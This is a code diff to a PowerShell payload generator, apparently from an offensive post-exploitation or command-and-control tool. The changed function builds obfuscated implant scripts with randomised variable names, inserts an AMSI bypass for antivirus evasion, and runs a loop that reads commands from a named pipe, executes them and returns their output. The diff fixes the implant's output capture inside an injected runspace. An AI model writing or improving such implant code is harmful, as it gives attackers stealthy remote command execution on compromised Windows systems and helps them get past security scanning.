@@ -167,13 +167,14 @@ function New-PayloadScript {
     $vRes=(&$rnd); $vErr=(&$rnd); $vJ=(&$rnd); $vT=(&$rnd)
     $vSec=(&$rnd); $vSid=(&$rnd); $vAr=(&$rnd); $vTm=(&$rnd)
     $vCb=(&$rnd); $vGz=(&$rnd); $vA=(&$rnd); $vB=(&$rnd)
-    $vC=(&$rnd); $vD=(&$rnd); $vWHO=(&$rnd)
+    $vC=(&$rnd); $vD=(&$rnd); $vWHO=(&$rnd); $vCl=(&$rnd)
 
-    # Write-Host in a CLR Runspace (InjectUnmanagedPS) discards output — no PSHost, stream 6
-    # is never dispatched and *>&1 has nothing to capture. Fix: store the Write-Host override
-    # as a string variable and prepend it to every command scriptblock so it is always in the
-    # same scope as the executing command. Function lookup finds it before the built-in cmdlet.
-    $whFuncDef = 'function Write-Host{param([Parameter(ValueFromPipeline=$true,ValueFromRemainingArguments=$true)][Object]$whO,[switch]$whNL,[System.ConsoleColor]$whFC,[System.ConsoleColor]$whBC,[string]$whS);if($null -ne $whO){Write-Output $whO}}'
+    # Write-Host in a CLR Runspace (InjectUnmanagedPS) — no PSHost, stream 6 silently discarded.
+    # Fix 1: override uses correct param names (Object/ForegroundColor/etc.) so -ForegroundColor
+    # calls bind cleanly and redirect to Write-Output (stream 1) instead of dying silently.
+    # Fix 2: streaming list collection — each output line committed before any exception can
+    # abort the pipeline and lose Out-String's un-flushed buffer (e.g., ObjectSid crash mid-run).
+    $whFuncDef = 'function Write-Host{param([Parameter(Position=0,ValueFromRemainingArguments=$true)]$Object,[switch]$NoNewline,$ForegroundColor,$BackgroundColor,[string]$Separator);if($null -ne $Object){Write-Output $Object}}'
     $whOverride = "`$$vWHO='$whFuncDef'"
 
     $amsiSnippet = Get-AmsiBypassSnippet -Technique $Config.Amsi
@@ -225,8 +226,9 @@ function New-PayloadScript {
             "`$$vCmd=`$$vRd.ReadLine();" +
             "if(`$$vCmd -eq 'exit'){break};" +
             "$moduleHandler;" +
-            "try{`$$vRes=. ([scriptblock]::Create(`$$vWHO+';'+`$$vCmd)) *>&1|Out-String;" +
-            "`$$vRes -split([char]10)|%{`$$vWr.WriteLine(`$_.TrimEnd())}}catch{`$$vErr=`$_.Exception.Message;`$$vErr -split([char]10)|%{`$$vWr.WriteLine(`$_)}};" +
+            "`$$vCl=[System.Collections.Generic.List[string]]::new();" +
+            "try{. ([scriptblock]::Create(`$$vWHO+';'+`$$vCmd)) *>&1|%{`$$vCl.Add(`"`$_`")}}catch{`$$vCl.Add(`"`$(`$_.Exception.Message)`")};" +
+            "`$$vCl|%{`$$vWr.WriteLine(`$_.TrimEnd())};" +
             "`$$vWr.WriteLine('$marker');`$$vWr.Flush()};" +
             "`$$vPipe.Close();`$$vPipe.Dispose()"
         )
@@ -253,8 +255,9 @@ function New-PayloadScript {
             "if(`$$vCb){`$$vCb=`$false}else{`$$vCmd=`$$vRd.ReadLine()};" +
             "if(`$$vCmd -eq 'exit'-or`$null -eq `$$vCmd){break};" +
             "$moduleHandler;" +
-            "try{`$$vRes=. ([scriptblock]::Create(`$$vWHO+';'+`$$vCmd)) *>&1|Out-String;" +
-            "`$$vRes -split([char]10)|%{`$$vWr.WriteLine(`$_.TrimEnd())}}catch{`$$vErr=`$_.Exception.Message;`$$vErr -split([char]10)|%{`$$vWr.WriteLine(`$_)}};" +
+            "`$$vCl=[System.Collections.Generic.List[string]]::new();" +
+            "try{. ([scriptblock]::Create(`$$vWHO+';'+`$$vCmd)) *>&1|%{`$$vCl.Add(`"`$_`")}}catch{`$$vCl.Add(`"`$(`$_.Exception.Message)`")};" +
+            "`$$vCl|%{`$$vWr.WriteLine(`$_.TrimEnd())};" +
             "`$$vWr.WriteLine('$marker');`$$vWr.Flush()};" +
             "`$$vPipe.Dispose()"
         )
